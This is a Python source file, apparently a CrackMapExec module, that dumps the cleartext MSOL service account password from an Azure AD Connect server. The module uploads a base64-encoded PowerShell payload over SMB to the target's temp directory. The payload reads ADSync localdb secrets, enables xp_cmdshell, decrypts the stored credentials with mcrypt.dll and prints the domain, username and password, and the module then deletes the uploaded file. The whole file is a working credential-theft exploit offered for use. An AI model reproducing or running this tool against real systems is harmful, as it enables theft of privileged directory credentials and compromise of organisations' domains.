# MSOL module for CME 
# Author of the module : https://twitter.com/Daahtk
# Based on the article : https://blog.xpnsec.com/azuread-connect-for-redteam/

from base64 import b64decode
from sys import exit
from os import path

class CMEModule:

   name = 'msol'
   description = 'Dump MSOL cleartext password from the localDB on the Azure AD-Connect server'
   supported_protocols = ['smb']
   opsec_safe = True 
   multiple_hosts = True

   def options(self, context, module_options):
       '''
           MSOL_PS1   // Path to the msol binary on your computer
       '''

       self.tmp_dir = "C:\\Windows\\Temp\\"
       self.share = "C$"
       self.tmp_share = self.tmp_dir.split(":")[1]
       self.msol = "msol.ps1"
       self.useembeded = True
       self.token = self.cmd = ""
       self.msol_embedded =b64decode('JHNxbGJpbj1AKEdldC1DaGlsZEl0ZW0gLVBhdGggQzpcIlByb2dyYW0gRmlsZXMiXCJNaWNyb3NvZnQgU1FMIFNlcnZlciJcIC1GaWx0ZXIgc3FsbG9jYWxkYi5leGUgLVJlY3Vyc2UpLmZ1bGxuYW1lCiRkYj1AKCYgJHNxbGJpbiBpbmZvIHwgZmluZHN0ciAvaSBBRFN5KQoKJGNsaWVudCA9IG5ldy1vYmplY3QgU3lzdGVtLkRhdGEuU3FsQ2xpZW50LlNxbENvbm5lY3Rpb24gLUFyZ3VtZW50TGlzdCAiRGF0YSBTb3VyY2U9KGxvY2FsZGIpXCRkYjtJbml0aWFsIENhdGFsb2c9QURTeW5jIgoKdHJ5IHsKICAgICRjbGllbnQuT3BlbigpCn0gY2F0Y2ggewogICAgV3JpdGUtSG9zdCAiWyFdIENvdWxkIG5vdCBjb25uZWN0IHRvIGxvY2FsZGIuLi4iCiAgICByZXR1cm4KfQoKV3JpdGUtSG9zdCAiWypdIFF1ZXJ5aW5nIEFEU3luYyBsb2NhbGRiIChtbXNfc2VydmVyX2NvbmZpZ3VyYXRpb24pIgoKJGNtZCA9ICRjbGllbnQuQ3JlYXRlQ29tbWFuZCgpCiRjbWQuQ29tbWFuZFRleHQgPSAiU0VMRUNUIGtleXNldF9pZCwgaW5zdGFuY2VfaWQsIGVudHJvcHkgRlJPTSBtbXNfc2VydmVyX2NvbmZpZ3VyYXRpb24iCiRyZWFkZXIgPSAkY21kLkV4ZWN1dGVSZWFkZXIoKQppZiAoJHJlYWRlci5SZWFkKCkgLW5lICR0cnVlKSB7CiAgICBXcml0ZS1Ib3N0ICJbIV0gRXJyb3IgcXVlcnlpbmcgbW1zX3NlcnZlcl9jb25maWd1cmF0aW9uIgogICAgcmV0dXJuCn0KCiRrZXlfaWQgPSAkcmVhZGVyLkdldEludDMyKDApCiRpbnN0YW5jZV9pZCA9ICRyZWFkZXIuR2V0R3VpZCgxKQokZW50cm9weSA9ICRyZWFkZXIuR2V0R3VpZCgyKQokcmVhZGVyLkNsb3NlKCkKCldyaXRlLUhvc3QgIlsqXSBRdWVyeWluZyBBRFN5bmMgbG9jYWxkYiAobW1zX21hbmFnZW1lbnRfYWdlbnQpIgoKJGNtZCA9ICRjbGllbnQuQ3JlYXRlQ29tbWFuZCgpCiRjbWQuQ29tbWFuZFRleHQgPSAiU0VMRUNUIHByaXZhdGVfY29uZmlndXJhdGlvbl94bWwsIGVuY3J5cHRlZF9jb25maWd1cmF0aW9uIEZST00gbW1zX21hbmFnZW1lbnRfYWdlbnQgV0hFUkUgbWFfdHlwZSA9ICdBRCciCiRyZWFkZXIgPSAkY21kLkV4ZWN1dGVSZWFkZXIoKQppZiAoJHJlYWRlci5SZWFkKCkgLW5lICR0cnVlKSB7CiAgICBXcml0ZS1Ib3N0ICJbIV0gRXJyb3IgcXVlcnlpbmcgbW1zX21hbmFnZW1lbnRfYWdlbnQiCiAgICByZXR1cm4KfQoKJGNvbmZpZyA9ICRyZWFkZXIuR2V0U3RyaW5nKDApCiRjcnlwdGVkID0gJHJlYWRlci5HZXRTdHJpbmcoMSkKJHJlYWRlci5DbG9zZSgpCgpXcml0ZS1Ib3N0ICJbKl0gVXNpbmcgeHBfY21kc2hlbGwgdG8gcnVuIHNvbWUgUG93ZXJzaGVsbCBhcyB0aGUgc2VydmljZSB1c2VyIgoKJGNtZCA9ICRjbGllbnQuQ3JlYXRlQ29tbWFuZCgpCiRjbWQuQ29tbWFuZFRleHQgPSAiRVhFQyBzcF9jb25maWd1cmUgJ3Nob3cgYWR2YW5jZWQgb3B0aW9ucycsIDE7IFJFQ09ORklHVVJFOyBFWEVDIHNwX2NvbmZpZ3VyZSAneHBfY21kc2hlbGwnLCAxOyBSRUNPTkZJR1VSRTsgRVhFQyB4cF9jbWRzaGVsbCAncG93ZXJzaGVsbC5leGUgLWMgYCJhZGQtdHlwZSAtcGF0aCAnJ0M6XFByb2dyYW0gRmlsZXNcTWljcm9zb2Z0IEF6dXJlIEFEIFN5bmNcQmluXG1jcnlwdC5kbGwnJztgJGttID0gTmV3LU9iamVjdCAtVHlwZU5hbWUgTWljcm9zb2Z0LkRpcmVjdG9yeVNlcnZpY2VzLk1ldGFkaXJlY3RvcnlTZXJ2aWNlcy5DcnlwdG9ncmFwaHkuS2V5TWFuYWdlcjtgJGttLkxvYWRLZXlTZXQoW2d1aWRdJyckZW50cm9weScnLCBbZ3VpZF0nJyRpbnN0YW5jZV9pZCcnLCAka2V5X2lkKTtgJGtleSA9IGAkbnVsbDtgJGttLkdldEFjdGl2ZUNyZWRlbnRpYWxLZXkoW3JlZl1gJGtleSk7YCRrZXkyID0gYCRudWxsO2Aka20uR2V0S2V5KDEsIFtyZWZdYCRrZXkyKTtgJGRlY3J5cHRlZCA9IGAkbnVsbDtgJGtleTIuRGVjcnlwdEJhc2U2NFRvU3RyaW5nKCcnJGNyeXB0ZWQnJywgW3JlZl1gJGRlY3J5cHRlZCk7V3JpdGUtSG9zdCBgJGRlY3J5cHRlZGAiJyIKJHJlYWRlciA9ICRjbWQuRXhlY3V0ZVJlYWRlcigpCgokZGVjcnlwdGVkID0gW3N0cmluZ106OkVtcHR5Cgp3aGlsZSAoJHJlYWRlci5SZWFkKCkgLWVxICR0cnVlIC1hbmQgJHJlYWRlci5Jc0RCTnVsbCgwKSAtZXEgJGZhbHNlKSB7CiAgICAkZGVjcnlwdGVkICs9ICRyZWFkZXIuR2V0U3RyaW5nKDApCn0KCmlmICgkZGVjcnlwdGVkIC1lcSBbc3RyaW5nXTo6RW1wdHkpIHsKICAgIFdyaXRlLUhvc3QgIlshXSBFcnJvciB1c2luZyB4cF9jbWRzaGVsbCB0byBsYXVuY2ggb3VyIGRlY3J5cHRpb24gcG93ZXJzaGVsbCIKICAgIHJldHVybgp9CgokZG9tYWluID0gc2VsZWN0LXhtbCAtQ29udGVudCAkY29uZmlnIC1YUGF0aCAiLy9wYXJhbWV0ZXJbQG5hbWU9J2ZvcmVzdC1sb2dpbi1kb21haW4nXSIgfCBzZWxlY3QgQHtOYW1lID0gJ0RvbWFpbic7IEV4cHJlc3Npb24gPSB7JF8ubm9kZS5Jbm5lclRleHR9fQokdXNlcm5hbWUgPSBzZWxlY3QteG1sIC1Db250ZW50ICRjb25maWcgLVhQYXRoICIvL3BhcmFtZXRlcltAbmFtZT0nZm9yZXN0LWxvZ2luLXVzZXInXSIgfCBzZWxlY3QgQHtOYW1lID0gJ1VzZXJuYW1lJzsgRXhwcmVzc2lvbiA9IHskXy5ub2RlLklubmVyVGV4dH19CiRwYXNzd29yZCA9IHNlbGVjdC14bWwgLUNvbnRlbnQgJGRlY3J5cHRlZCAtWFBhdGggIi8vYXR0cmlidXRlIiB8IHNlbGVjdCBAe05hbWUgPSAnUGFzc3dvcmQnOyBFeHByZXNzaW9uID0geyRfLm5vZGUuSW5uZXJUZXh0fX0KCldyaXRlLUhvc3QgIkRvbWFpbjogJCgkZG9tYWluLkRvbWFpbikiCldyaXRlLUhvc3QgIlVzZXJuYW1lOiAkKCR1c2VybmFtZS5Vc2VybmFtZSkiCldyaXRlLUhvc3QgIlBhc3N3b3JkOiAkKCRwYXNzd29yZC5QYXNzd29yZCkiCg==')
      
       if "MSOL_PS1" in module_options:
           self.MSOL_PS1 = module_options["MSOL_PS1"]
           self.useembeded = False


   def execscript(self, _, connection):
        command = f"C:\\windows\\system32\\WindowsPowershell\\v1.0\\powershell.exe {self.tmp_dir}msol.ps1"
        return connection.execute(command, True)
        
   def on_admin_login(self, context, connection):

        if self.useembeded:
            file_to_upload = "/tmp/msol.ps1"
            with open(file_to_upload, 'wb') as msol:
                msol.write(self.msol_embedded)
        else:
            if path.isfile(self.MSOL_PS1):
               file_to_upload = self.MSOL_PS1
            else:
               context.log.error(f"Cannot open {self.MSOL_PS1}")
               exit(1)

        context.log.info(f"Uploading {self.msol}")
        with open(file_to_upload, 'rb') as msol:
            try:
               connection.conn.putFile(self.share, f"{self.tmp_share}{self.msol}", msol.read)
               context.log.success(f"Msol script successfully uploaded")
            except Exception as e:
               context.log.error(f"Error writing file to share {self.tmp_share}: {e}")
               return
               
        try:
            if self.cmd == "":
                context.log.info(f"Executing the script")
                p = self.execscript(context, connection)
                for line in p.splitlines():
                    p1, p2 = line.split(" ", 1)
                    context.log.highlight(f"{p1} {p2}")
            else :
                context.log.error(f"Script Execution Impossible")
                
        except Exception as e:
            context.log.error(f"Error runing command: {e}")
        finally:
            try:
                connection.conn.deleteFile(self.share, f"{self.tmp_share}{self.msol}")
                context.log.success(f"Msol script successfully deleted")
            except Exception as e:
                context.log.error(f"Error deleting msol script on {self.share}: {e}")
